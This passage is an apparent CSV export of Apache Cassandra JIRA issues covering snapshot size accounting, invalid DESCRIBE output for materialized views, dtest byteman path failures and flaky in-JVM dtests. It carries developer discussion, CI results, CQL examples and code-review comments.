;16/Mar/22 08:29;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,CASSANDRA-14587,,,,,,,,,,,,,,CASSANDRA-16843,,CASSANDRA-17357,,,,,,,,,,0.0,paulo,,,,,,,,,,,,,,Correctness -> API / Semantic Implementation,,,,,,,,Normal,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Mar 17 15:52:01 UTC 2022,,,,,,,All,,,,"0|z0ypjs:",9223372036854775807,,,,blerer,brandon.williams,,,Normal,,3.11.11,,https://github.com/apache/cassandra/commit/95a622305722889c321204c4bca68a3517a29aab,,,,,,,,,note on changes.txt,,,,,"19/Jan/22 02:06;paulo;The snapshot true size is calculated by [Directories.getTrueAllocatedSizeIn|https://github.com/apache/cassandra/blob/cassandra-3.11/src/java/org/apache/cassandra/db/Directories.java#L960].

This method creates a [SSTableSizeSummer|https://github.com/apache/cassandra/blob/cassandra-3.11/src/java/org/apache/cassandra/db/Directories.java#L1054] using the snapshot folder as the list of files to be iterated/counted and the list of live sstables as the list of files to be skipped (toSkip set).

The [isAcceptable|https://github.com/apache/cassandra/blob/cassandra-3.11/src/java/org/apache/cassandra/db/Directories.java#L1064] method decides whether the snapshot file size must be counted by checking if it's an sstable component and if it's not present on the ""toSkip"" set.

However the snapshot files will never be present in the ""toSkip"" set, causing the snapshot file sizes to always be accounted - whether or not a ""corresponding"" live sstable is found.

I believe the original implementer's intent was to verify that the ""corresponding"" sstable file is present in the ""toSkip"" set, but it doesn't reconstruct the original sstable file from the snapshot file before checking it's present on the set.

I created a [PR|https://github.com/apache/cassandra/pull/1408] with a reproduction and preliminary fix.

The reproduction can be found [on this test|https://github.com/apache/cassandra/pull/1408/files#diff-ef5be0b69d0440b76021282c4b24bad69770ef9419be260df2169f49921db377R346].

[The fix|https://github.com/apache/cassandra/pull/1408/files#diff-bb20d0c655884c2211213190ae4787ace619cdff4c0235f147db7dfbf1e7a869R1067] only counts the snapshot file size if the file is an sstable component *AND* if a corresponding live sstable component can *not* be found on ""snapshot_dir/../../file_name"" (since the snapshot file is found on <table_dir>/snapshots/<snapshot_name>/file).

The same snapshot of the ticket description is displayed as following after the fix:
{noformat}
$ nodetool listsnapshots
Snapshot Details:
Snapshot name Keyspace name Column family name True size Size on disk
test          ks1           tbl1               0 bytes   5.69 KiB

Total TrueDiskSpaceUsed: 0 bytes
{noformat};;;","19/Jan/22 02:09;paulo;[~brandon.williams] I found this while working on CASSANDRA-16843. Can you take a look since it's somewhat related?

If the approach looks good I will work on more tests (secondary index) and fix existing tests, as well as port to other branches - this might affect 3.0 too.;;;","19/Jan/22 13:08;brandon.williams;Nice catch.  This looks like a good approach to me, and I suspect 3.0 has a problem as well.;;;","07/Feb/22 23:53;paulo;Curiously this did not reproduce on 3.0, so I used the same approach of comparing the names of the snapshot files with the files present in the live set to skip accounting live sstables during snapshot true size calculation.

ccm repro after fix:
{noformat}
% ccm node1 nodetool -- snapshot -t test test_ks

Requested creating snapshot(s) for [test_ks] with snapshot name [test]
Snapshot directory: test

% ccm node1 nodetool tablestats test_ks.tbl | grep -i snapshot
    Space used by snapshots (total): 0

% ccm node1 nodetool listsnapshots

Snapshot Details:
Snapshot name Keyspace name Column family name True size Size on disk
test          test_ks       tbl                0 bytes   5.74 KB

Total TrueDiskSpaceUsed: 0 bytes

% ccm node1 nodetool compact test_ks tbl

% ccm node1 nodetool tablestats test_ks.tbl | grep -i snapshot
    Space used by snapshots (total): 5044

% ccm node1 nodetool listsnapshots

Snapshot Details:
Snapshot name Keyspace name Column family name True size Size on disk
test          test_ks       tbl                4.93 KB   5.74 KB

Total TrueDiskSpaceUsed: 4.93 KB
{noformat}

I will use the new approach of using only the directory structure to decide whether a snapshot file is present in the live set when decoupling snapshot size computation from {{ColumnFamilyStore}} on CASSANDRA-16843.

While working on this I noticed that secondary indexes are not included in the computation of the true size so I created CASSANDRA-17357 to address this separately.

3.11+ patches and CI below:

|[3.11|https://github.com/apache/cassandra/compare/cassandra-3.11...pauloricardomg:CASSANDRA-17267-3.11]|[tests|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1414/]|
|[4.0|https://github.com/apache/cassandra/compare/cassandra-4.0...pauloricardomg:CASSANDRA-17267-4.0]|[tests|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1415/]|
|[trunk|https://github.com/apache/cassandra/compare/trunk...pauloricardomg:CASSANDRA-17267-trunk]|[tests|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1422/]|;;;","11/Feb/22 09:17;blerer;Thanks [~paulo]. The patch looks good to me but the tests needs to be re-run.;;;","22/Feb/22 13:52;paulo;In the [previous test run|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1422/] {{org.apache.cassandra.index.sasi.SASIIndexTest.testSASIComponentsAddedToSnapshot}} was getting stuck when running within the suite (worked when executed individually).

I tracked down the reason to the {{ReadExecutionController}} not being closed properly on other tests, causing operations to block indefinitely on the {{{}OpOrder{}}}. Fixed [on this commit|https://github.com/apache/cassandra/commit/77f688e75ff403875755f34dc31ab75401bcaa3d] on all branches.

I created CASSANDRA-17400 to add a checker to verify resources are being properly closed to avoid stuck tests in the future.

Resubmitted CI:
|[3.11|https://github.com/apache/cassandra/compare/cassandra-3.11...pauloricardomg:CASSANDRA-17267-3.11]|[tests|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1440/]|
|[4.0|https://github.com/apache/cassandra/compare/cassandra-4.0...pauloricardomg:CASSANDRA-17267-4.0]|[tests|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1441/]|
|[trunk|https://github.com/apache/cassandra/compare/trunk...pauloricardomg:CASSANDRA-17267-trunk]|[tests|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1442/]|;;;","28/Feb/22 09:33;blerer;+1;;;","09/Mar/22 11:03;smiklosovic;[~paulo] would you mind if I take over as you are swamped these days?;;;","14/Mar/22 20:26;paulo;Committed to cassandra-3.11 branch and merged up to {{trunk}} as {{{}95a622305722889c321204c4bca68a3517a29aab{}}}.;;;","15/Mar/22 18:47;jmckenzie;Doubt any of the ""only failed once"" below are related to this ticket.

 

[CI Results]
Branch: trunk, build number: 1010
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-trunk/1010/]
JIRA: CASSANDRA-17267
commit url: [https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=95a622305722889c321204c4bca68a3517a29aab]
affected paths:
 * test/unit/org/apache/cassandra/db/ColumnFamilyStoreTest.java
 * test/unit/org/apache/cassandra/index/sasi/SASIIndexTest.java
 * CHANGES.txt
 * src/java/org/apache/cassandra/db/Directories.java

Build Result: UNSTABLE
Passing Tests: 44358
Failing Tests: 17
||Test|Failures|JIRA|
|dtest-upgrade.upgrade_tests.cql_tests.TestCQLNodes2RF1_Upgrade_indev_4_0_x_To_indev_trunk.test_static_cf|4 of 62|CASSANDRA-17309?|
|dtest.write_failures_test.TestMultiDCWriteFailures.test_oversized_mutation|8 of 62|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.db.commitlog.BatchCommitLogTest.testOutOfOrderLogDiscard[3]|1 of 62|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|junit.framework.TestSuite.org.apache.cassandra.audit.BinAuditLoggerTest|1 of 62|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*audit*%22]|
|org.apache.cassandra.distributed.test.CASTest.testSuccessfulWriteDuringRangeMovementFollowedByConflicting|4 of 62|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-offheap.write_failures_test.TestMultiDCWriteFailures.test_oversized_mutation|8 of 62|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.cql_tests.TestCQLNodes2RF1_Upgrade_indev_4_0_x_To_indev_trunk.test_noncomposite_static_cf|1 of 62|CASSANDRA-17309?|
|org.apache.cassandra.distributed.test.CasCriticalSectionTest.criticalSectionTest|8 of 62|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade_with_internode_ssl|27 of 62|CASSANDRA-17305?|
|org.apache.cassandra.db.lifecycle.LogTransactionTest.testGetTemporaryFilesSafeAfterObsoletion-cdc|11 of 62|CASSANDRA-17286?|
|org.apache.cassandra.cql3.validation.operations.CompactStorageTest.testCfmCounterCQL|1 of 62|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_parallel_upgrade|2 of 62|CASSANDRA-17305?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_rolling_upgrade|28 of 62|CASSANDRA-17305?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade|28 of 62|CASSANDRA-17305?|
|org.apache.cassandra.cql3.KeywordTest.test[keyword CLUSTERING isReserved false]|2 of 62|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_rolling_upgrade_with_internode_ssl|27 of 62|CASSANDRA-17305?|
|dtest-novnode.write_failures_test.TestMultiDCWriteFailures.test_oversized_mutation|8 of 62|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|;;;","15/Mar/22 18:58;paulo;[~jmckenzie] I've checked and don't think these failures are related to this change. Did you trigger a re-run?;;;","17/Mar/22 15:52;jmckenzie;{quote}Did you trigger a re-run?
{quote}
I did not. I'm updating tickets with the results of CI based on the commit, however CI is in a pretty rough spot right now so this is likely minimally valuable outside checking tests that have only failed once.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DESCRIBE KEYSPACE / MATERIALIZED VIEW generates invalid CQL for views,CASSANDRA-17266,13423259,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,taiga-elephant,taiga-elephant,18/Jan/22 11:58,17/Jun/22 07:43,13/Jul/23 08:40,28/Mar/22 12:31,4.0.4,4.1,4.1-alpha1,,,,CQL/Syntax,,,,1,lhf,"Materialized views do not allow default_time_to_live option in CQL (see CASSANDRA-12868).

But, if the MV was created without this option, DESCRIBE KEYSPACE / MATERIALIZED VIEW command generates CQL that includes it.

E.g.
{code:java}
CREATE KEYSPACE test WITH replication = {'class': 'SimpleStrategy', 'replication_factor': '1'};

USE test;

CREATE TABLE test_table(
  id text,
  date text,
  col1 text,
  col2 text,
  PRIMARY KEY(id,date)
) WITH default_time_to_live = 60 AND CLUSTERING ORDER BY (date DESC);

CREATE MATERIALIZED VIEW test_view AS
SELECT id, date, col1
FROM test_table
WHERE id IS NOT NULL AND date IS NOT NULL
PRIMARY KEY(id, date);{code}
It is OK. 
{code:java}
DESCRIBE MATERIALIZED VIEW test_view; {code}
returns the same CQL + all default options:
{code:java}
CREATE MATERIALIZED VIEW test.test_view AS
    SELECT id, date, col1
    FROM test.test_table
    WHERE id IS NOT NULL AND date IS NOT NULL
    PRIMARY KEY (id, date)
 WITH CLUSTERING ORDER BY (date ASC)
    AND additional_write_policy = '99p'
    AND bloom_filter_fp_chance = 0.01
    AND caching = {'keys': 'ALL', 'rows_per_partition': 'NONE'}
    AND cdc = false
    AND comment = ''
    AND compaction = {'class': 'org.apache.cassandra.db.compaction.SizeTieredCompactionStrategy', 'max_threshold': '32', 'min_threshold': '4'}
    AND compression = {'chunk_length_in_kb': '16', 'class': 'org.apache.cassandra.io.compress.LZ4Compressor'}
    AND crc_check_chance = 1.0
    AND default_time_to_live = 0
    AND extensions = {}
    AND gc_grace_seconds = 864000
    AND max_index_interval = 2048
    AND memtable_flush_period_in_ms = 0
    AND min_index_interval = 128
    AND read_repair = 'BLOCKING'
    AND speculative_retry = '99p';
{code}
Note the 'default_time_to_live = 0' clause! If this veiw is dropped, re-creating it using DESCRIBE output would fail with 
{noformat}
Cannot set default_time_to_live for a materialized view. Data in a materialized view always expire at the same time than the corresponding data in the parent table.{noformat}

+Additional Information for newcomers:+

The code writting the table parameters is in {{TableParams.appendCqlTo}} and is called through {{TableMetadata.appendTableOptions}}. Those method will need to have a new parameter specifying if the call is for a table or a materialized view.
Some unit test need to be adapted in {{DescribeStatementTest}} ",,blerer,brandon.williams,djatnieks,gustavb,smiklosovic,taiga-elephant,yashLadha,,,,,,,,"smiklosovic closed pull request #1427: CASSANDRA-17266 Remove default_time_to_live for Views in describe
URL: https://github.com/apache/cassandra/pull/1427


;17/Jun/22 07:43;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Mar 28 11:24:51 UTC 2022,,,,,,,All,,,,"0|z0yoqw:",9223372036854775807,,,,blerer,brandon.williams,,,Low,,4.0.0,,https://github.com/apache/cassandra/commit/d0458abdb321a48771631278e3b09dd7aa4e2edc,,,,,,,,,Updated the test to use the new describe ouptut and verified by dropping and re-using the output (from describe materialized view statement).,,,,,"18/Jan/22 13:03;brandon.williams;Tagged this 4.0.x but versions should be examined.;;;","26/Jan/22 04:19;yashLadha;Hi [~taiga-elephant] I would like to work on this issue as it will be a good task for me to get to know the code.;;;","26/Jan/22 05:27;yashLadha;PR : https://github.com/apache/cassandra/pull/1427;;;","31/Jan/22 17:26;blerer;CI results for [4.0|https://app.circleci.com/pipelines/github/blerer/cassandra/259/workflows/01af39d8-847c-4c5a-8418-80e444cb7afb] and [trunk|https://app.circleci.com/pipelines/github/blerer/cassandra/258/workflows/03a953ed-8df6-41ef-8b2f-1816c4d242b1].;;;","01/Feb/22 10:21;blerer;[~yashLadha] One of the DTest [failed|https://app.circleci.com/pipelines/github/blerer/cassandra/258/workflows/03a953ed-8df6-41ef-8b2f-1816c4d242b1/jobs/2357/tests#failed-test-0] after looking into I discover that it was we were still returning the correct value for DESCRIBE statements. What changed is that we stop accepting {{defaultTimeToLive = 0}} in 4.0 (CASSANDRA-13426). We need to revert that behavior and accept {{defaultTimeToLive = 0}} to allow people to restore old backup but we should keep the new logic and modify the {{cqlsh_tests.test_cqlsh.TestCqlsh}} test. Could you do that? 
;;;","03/Feb/22 14:24;yashLadha;Sure [~blerer] let me take a look at this, sorry for the delayed response wasn't able to look into this.;;;","16/Mar/22 07:36;smiklosovic;[~yashLadha] any progress on this?;;;","21/Mar/22 18:09;smiklosovic;Assigning to myself due to Yash inactivity.;;;","22/Mar/22 15:23;smiklosovic;4.0 [https://github.com/instaclustr/cassandra/tree/CASSANDRA-17266-4.0]
modified dtest - [https://github.com/smiklosovic/cassandra-dtest/tree/CASSANDRA-17266]
build 4.0: [https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1538/];;;","24/Mar/22 07:17;smiklosovic;[~brandon.williams] [~blerer] would you mind to review? The build I got is quite nice. ;;;","25/Mar/22 07:02;smiklosovic;maybe [~bereng] could take a look?;;;","25/Mar/22 08:52;blerer;Overall the patches look good to me, I just have a few minor comments/questions:
* Why do we need those 2 USE queries in the {{ViewTimesTest}}? It seems to me that they could be avoided by providing the view name qualified with the keyspace. We do not seems to use them anymore in trunk. 
* In {{testCreateMvWithTTL}} we do not check the exception being thrown as it is done in {{testAlterMvWithNoZeroTTL}}. This has apparently been fixed in trunk.
* It would be good to have a branch for trunk as the {{ViewTimesTest}} has apparently changed.
* [~yashLadha] has contributed to the patch therefore it should be mentioned as one of the author of the patch.  ;;;","25/Mar/22 09:37;smiklosovic;Thanks [~blerer], all addressed. I ll provide trunk branch too.;;;","26/Mar/22 12:35;smiklosovic;4.0: https://github.com/instaclustr/cassandra/tree/CASSANDRA-17266-4.0
4.0 build: https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1538/
trunk: https://github.com/instaclustr/cassandra/tree/CASSANDRA-17266-trunk
trunk build: https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1545

[~blerer] I am merging on your +1.;;;","28/Mar/22 11:24;blerer;Thanks [~smiklosovic] It looks good to me.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
dtest byteman errors,CASSANDRA-17265,13423214,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,bereng,bereng,18/Jan/22 09:15,17/Feb/22 05:52,13/Jul/23 08:40,26/Jan/22 13:17,NA,,,,,,Test/dtest/python,,,,0,,"Testing on another ticket I noticed 4.0 was failing 3 dtests on circle on missing btm files. I checked and the files _are there_. Also it doesn't repro locally. See 4.0 vanilla runs [here|https://app.circleci.com/pipelines/github/bereng/cassandra/555/workflows/21cfe9e4-2d17-45a2-8ea8-1593b7ed6d8b]
",,bereng,brandon.williams,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17289,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,brandon.williams,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Feb 17 05:52:30 UTC 2022,,,,,,,All,,,,"0|z0yogw:",9223372036854775807,,,,bereng,brandon.williams,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/a0872a76650b6c850bf429fd2a123ed9cfd59858,,,,,,,,,See comments,,,,,"20/Jan/22 11:53;bereng;Weird. Running the test locally, locally with the preceding test it runs on circle, on circle just that method, just the class or the full file works. But a full dtest run renders:

{noformat}
11:17:45,567 read_repair_test DEBUG Current path byteman func is:/tmp/tmp61o2mx51
11:17:45,567 read_repair_test DEBUG ['bin', 'data', 'logs']
11:17:45,567 read_repair_test DEBUG Script path is: ./byteman/read_repair/stop_writes.btm
{noformat}

Which I can only think there is some obscure test cross-talk or circle env weird juggling of files.;;;","21/Jan/22 04:47;brandon.williams;FWIW, I think that test is being skipped on jenkins, here's why on my lab (where cassandra is on trunk):

{code}
$ pytest --cassandra-dir=~/cassandra --keep-failed-test-dir read_repair_test.py::TestReadRepairGuarantees::test_atomic_writes -rsx
============================================================================================== test session starts ===============================================================================================
platform linux -- Python 3.8.10, pytest-3.6.4, py-1.11.0, pluggy-0.7.1
rootdir: /home/cassandra/cassandra-dtest, inifile: pytest.ini
plugins: timeout-1.4.2, repeat-0.9.1, flaky-3.7.0
timeout: 900.0s
timeout method: signal
timeout func_only: False
collected 2 items                                                                                                                                                                                                

read_repair_test.py ss                                                                                                                                                                                     [100%]
============================================================================================ short test summary info =============================================================================================
SKIP [2] /home/cassandra/cassandra-dtest/conftest.py:507: ported to in-JVM from 4.0 >= 4.1
{code};;;","21/Jan/22 05:43;bereng;^yes I noticed that. It is being skipped _without_ vnodes but ran _with_ vnodes.;;;","21/Jan/22 12:46;brandon.williams;Indeed, it runs with vnodes (and for completeness, passes for me.) This seems like its own bit of oversight, since that shouldn't (in)validate the test.;;;","21/Jan/22 13:32;brandon.williams;Looks like an explicit byteman path does the trick: [here|https://github.com/driftx/cassandra-dtest/commit/9b0a6ed0129ad0be732766aa4e81281f5972096f] -> [https://app.circleci.com/pipelines/github/driftx/cassandra/339/workflows/bb81d632-ceb6-407a-8f09-d71d466e611e/jobs/3524]

 

Only circle knows why and just these tests.;;;","21/Jan/22 13:35;brandon.williams;It looks like we're using relative (to cwd) paths for all instances of byteman scripts.  This is probably a bad assumption in general and we should make them all explicit.  ;;;","24/Jan/22 05:50;bereng;Right. I had been experimenting with [a different approach|https://github.com/apache/cassandra-dtest/pull/175] (see commit list) by changing into the right folder before submitting instead of an absolute path and yes it fixes it. That worked for that test but not for the other 2. That doesn't explain why it started failing suddenly when it was working before or the root cause.

Also running the test on circle in isolation always succeeds for me. The problem comes from running the full dtest suite. It's like there is some cross talk between tests somewhere.

I will investigate a bit more otherwise settle on the absolute path solution bc I am running out of options.;;;","24/Jan/22 10:51;bereng;Well some progress. We have all tests passing _in a full circle dtests run_ except for the {{test_transient_noop_write}} which now fails in a new way complaining about a missing jolokia class. It fails consistenly on both [trunk|https://app.circleci.com/pipelines/github/bereng/cassandra/569/workflows/a5566d24-6776-461f-9ba0-8bc183efe051] and [4.0|https://app.circleci.com/pipelines/github/bereng/cassandra/568/workflows/1dd11125-94ec-4bf5-81a0-fe68f535caea]

Looks legit to me but don't know where it is coming from yet.;;;","25/Jan/22 08:49;bereng;I'm not getting anywhere with this. I am thinking maybe we should merge what we have now to get CI greener for everybody and look at the jolokia thing in isolation. So that we don't get stuck on it. Dunno wdyt?;;;","25/Jan/22 23:45;brandon.williams;I think if we're going to use explicit paths (and I believe that is the correct solution) then I think we should also do that for all byteman scripts everywhere, not only for consistency but also to prevent future problems.  I've done this in my branch [here|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17265].  I also encountered the jolokia error after doing this, and was immediately struck by the use of a relative path to the jar, which I also made explicit in my branch and [it passes on circle|https://app.circleci.com/pipelines/github/driftx/cassandra?branch=CASSANDRA-17265&filter=all].
;;;","26/Jan/22 05:44;bereng;Ok all praise and glory to you then :-)

But I don't understand how you managed to get 2 runs in circle against the same SHA where one passes and the other one has 40+ failures. Also just for safety I triggered a jenkins CI run [here|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch-dtest/1157/].

If the circle SHA/multi-run has some reasonable explanation and jenkins is good I am +1 on your solution.;;;","26/Jan/22 05:51;bereng;Also reviewing CASSANDRA-17243 I noticed the jolokia problem seems quite widespread so this will be very good to merge.;;;","26/Jan/22 07:21;bereng;Jenkins finished good and the circle thing sure it's sthg you can explain and that I missing. +1 and moving to ready to commit.;;;","26/Jan/22 12:27;brandon.williams;bq. But I don't understand how you managed to get 2 runs in circle against the same SHA where one passes and the other one has 40+ failures. 

The cassandra SHA is the same because that is simply the circle commit to use my dtest repo, where the real action was happening... somewhat poorly, as the 40+ failure runs were stupid mistakes I made, but circle was my test env. If you look closely the runs with lot of failures were cancelled as I noticed that and then manually retriggered when fixed.

;;;","26/Jan/22 12:59;bereng;Aha you manually retriggered them ok icwym.;;;","26/Jan/22 13:17;brandon.williams;Committed! Thanks.;;;","16/Feb/22 15:58;e.dimitrova;I see a lot Jolokia having trouble to start lately, can it be related? It happens with different tests both in Circle and Jenkins.

Example:

[https://ci-cassandra.apache.org/job/Cassandra-trunk/959/testReport/dtest-offheap.client_request_metrics_local_remote_test/TestClientRequestMetricsLocalRemote/test_batch_and_slice/]

 

Thoughts?;;;","16/Feb/22 16:18;brandon.williams;If the jar is found, it's not from this.  It may be a bit of a red herring and as it says the port is in use from an orphan process.;;;","17/Feb/22 05:52;bereng;Yep that port collision error message is quite common afaik and we never got to the bottom of it.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fixes for intermittent in-JVM dtest failures,CASSANDRA-17256,13422066,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jonmeredith,jonmeredith,jonmeredith,12/Jan/22 00:01,27/May/22 19:25,13/Jul/23 08:40,03/Feb/22 21:35,3.0.26,3.11.12,4.0.2,4.1,4.1-alpha1,,Test/dtest/java,,,,0,,"Improvements to StreamingTransferTest, MixedModeMessageForwardTest and SchemaDisagreementTest flakes.

For 3.0, adopt the ring settling properties used on trunk. For all releases increase to 15s for ring settling.
For all branches, disable autocompaction during shutdown.
For 4.0 and up, shut down the scheduled executors a little later.
",,benedict,jonmeredith,maedhroz,,,,,,,,,,,,"jonmeredith opened a new pull request #1395:
URL: https://github.com/apache/cassandra/pull/1395


   See [CASSANDRA-17256](https://issues.apache.org/jira/browse/CASSANDRA-17256)


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;12/Jan/22 00:38;githubbot;600","jonmeredith opened a new pull request #1396:
URL: https://github.com/apache/cassandra/pull/1396


   See [CASSANDRA-17256](https://issues.apache.org/jira/browse/CASSANDRA-17256)


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;12/Jan/22 00:39;githubbot;600","jonmeredith opened a new pull request #1397:
URL: https://github.com/apache/cassandra/pull/1397


   See [CASSANDRA-17256](https://issues.apache.org/jira/browse/CASSANDRA-17256)


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;12/Jan/22 00:39;githubbot;600","maedhroz commented on a change in pull request #1395:
URL: https://github.com/apache/cassandra/pull/1395#discussion_r783380199



##########
File path: test/distributed/org/apache/cassandra/distributed/impl/Instance.java
##########
@@ -550,6 +550,14 @@ public void startup(ICluster cluster)
         sync(() -> {
             try
             {
+                if (config.has(GOSSIP))
+                {
+                    // TODO: hacky
+                    System.setProperty(""cassandra.ring_delay_ms"", ""5000"");

Review comment:
       Did we want 15 second here (as it is in the 4.0 and trunk branches)?




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;12/Jan/22 19:25;githubbot;600","maedhroz commented on a change in pull request #1397:
URL: https://github.com/apache/cassandra/pull/1397#discussion_r783420050



##########
File path: test/distributed/org/apache/cassandra/distributed/impl/Instance.java
##########
@@ -737,16 +739,17 @@ private Config loadConfig(IInstanceConfig overrides)
                                 () -> SecondaryIndexManager.shutdownAndWait(1L, MINUTES),
                                 () -> IndexSummaryManager.instance.shutdownAndWait(1L, MINUTES),
                                 () -> ColumnFamilyStore.shutdownExecutorsAndWait(1L, MINUTES),
+                                () -> PendingRangeCalculatorService.instance.shutdownAndWait(1L, MINUTES),
                                 () -> BufferPools.shutdownLocalCleaner(1L, MINUTES),
                                 () -> Ref.shutdownReferenceReaper(1L, MINUTES),
                                 () -> Memtable.MEMORY_POOL.shutdownAndWait(1L, MINUTES),
                                 () -> DiagnosticSnapshotService.instance.shutdownAndWait(1L, MINUTES),
                                 () -> SSTableReader.shutdownBlocking(1L, MINUTES),
-                                () -> shutdownAndWait(Collections.singletonList(ActiveRepairService.repairCommandExecutor())),
-                                () -> ScheduledExecutors.shutdownNowAndWait(1L, MINUTES),
-                                () -> SnapshotManager.shutdownAndWait(1L, MINUTES)

Review comment:
       Should probably keep `SnapshotManager` shutdown.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;12/Jan/22 20:28;githubbot;600","jonmeredith commented on a change in pull request #1395:
URL: https://github.com/apache/cassandra/pull/1395#discussion_r783509975



##########
File path: test/distributed/org/apache/cassandra/distributed/impl/Instance.java
##########
